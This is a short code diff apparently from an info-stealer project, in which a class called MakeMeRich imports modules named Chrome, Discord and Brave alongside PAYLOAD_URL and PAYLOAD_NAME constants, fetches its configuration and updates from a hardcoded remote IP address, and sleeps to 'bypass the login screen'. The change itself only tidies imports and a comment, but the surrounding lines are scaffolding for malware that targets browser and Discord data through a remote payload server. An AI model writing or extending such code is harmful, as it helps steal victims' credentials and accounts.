@@ -1,5 +1,3 @@
-from http import server
-from wsgiref.simple_server import server_version
 from chrome import Chrome
 from discord import Discord
 from brave import Brave
@@ -14,7 +12,7 @@ from constants import MY_HOME, PAYLOAD_URL, PAYLOAD_NAME
 class MakeMeRich(object):
     def __init__(self) -> None:
         self.config = "http://45.56.115.91:8000/config.json"
-        self.local_version = 1.0  # when deploy a new version, change that to match the server
+        self.local_version = 1.0  # when deploying a new version, change that to match the server
         self.check_updates()
 
         sleep(120)  # time to bypass the login screen
